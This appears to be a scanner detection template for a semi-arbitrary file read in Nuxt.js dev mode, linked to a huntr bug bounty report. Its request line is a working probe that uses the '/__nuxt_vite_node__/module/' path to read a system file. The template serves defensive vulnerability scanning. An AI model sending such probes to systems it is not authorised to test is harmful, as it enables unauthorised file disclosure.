id: "nuxt-js-semi-lfi"
name: "Semi Arbitrary File Read in Dev Mode - Nuxt.js"
severity: "medium"
description: "Arbitrary File Read in Dev Mode in Nuxt.js"
tech:
  - "nuxt"
tags:
  - "huntr"
  - "lfi"
  - "nuxtjs"
  - "vuln"
reference: "https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/"
spaExclusion: true
request:
  method: "GET"
  path: "/__nuxt_vite_node__/module//bin/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "\"plugin\":"
      - "\"pluginCode\":"
      - "\"id\":"
    condition: "and"
  - type: "word"
    part: "header"
    words:
      - "application/json"
